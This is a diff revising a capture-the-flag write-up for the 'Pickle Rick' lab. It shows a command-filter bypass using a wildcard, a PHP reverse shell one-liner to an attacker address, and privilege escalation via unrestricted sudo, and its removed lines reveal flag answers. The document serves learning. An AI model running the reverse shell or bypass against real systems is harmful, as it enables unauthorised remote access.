@@ -76,44 +76,51 @@ Great! First flag found.
 
 ## Second ingredient
 
-* read *clue.txt* file with ```/bin/c?t clue.txt``` and it states:
+In order to understand where we can find the second flag, let's read the clue we have just found using ```/bin/c?t clue.txt```; it states:
+
 *Look around the file system for the other ingredient.*
 
-* in */home/rick* there is *second ingredients* file (```ls -l /home/rick```)
+So, we just need to look over the file system to get the next flag.
 
-* lets cat it: ```/bin/c?t "/home/rick/second ingredients"``` (fai reference a livello
-  di bandit in cui spiego come si fa cat in file che contiene spazie nel nome)
+Then, if we enter in **/home/rick**, there is a file named *second ingredients* (```ls -l /home/rick```).
 
-  2nd ingredient: 1 jerry tear
+Let's cat it: 
+
+```/bin/c?t "/home/rick/second ingredients"``` 
+
+(get a look to this writeup I wrote for more regarding files with spaces in their name ;) [link](https://francevarotz98.github.io/2022/10/08/otw-bandit-writeup.html#level-2--3))
+
 
 ## Third ingredient
 
-* rev shell using php
-
-![img6](/images/pickle_rick-thm/img6.png?raw=true):
+For the third, and last, ingredient I decided to create a reverse shell (even if it is not needed). In order to do so, in a terminal start listening to a port (e.g., port 7777); then, in the command panel insert the following command:
 
 ```
-php -r '$sock=fsockopen("10.8.12.35",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+php -r '$sock=fsockopen("<YOUR_IP_address>",7777);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 ```
 
-* cat php files in order to understand how to open other tabs in portal.php page
+and pressthee *execute* button.
 
-* use ```sudo -l``` to priv esc, result:
+![img6](/images/pickle_rick-thm/img6.png?raw=true)
+
+Nice !! We have a rev shell!
+
+Now, note that file 3rd.txt can only be read by root user.
+
+Therefore, run ```sudo -l``` (see here [link](https://www.explainshell.com/explain?cmd=sudo+-l) for more about the *l* option in sudo command)
+and this is what we are going to obtain:
+
 ```
 $ sudo -l
-Matching Defaults entries for www-data on
-    ip-10-10-100-151.eu-west-1.compute.internal:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on
-        ip-10-10-100-151.eu-west-1.compute.internal:
+<snip>
+User www-data may run the following commands <snip>:
     (ALL) NOPASSWD: ALL
 ```
-so all the commands can be run by www-data
 
-* then:
+so: we can run all the commands as sudo in the whole file system !!!
+
+Then:
 
 ![img7](/images/pickle_rick-thm/img7.png?raw=true)
 
-3rd ingredient: fleeb juice
+3rd ingredient found ;)
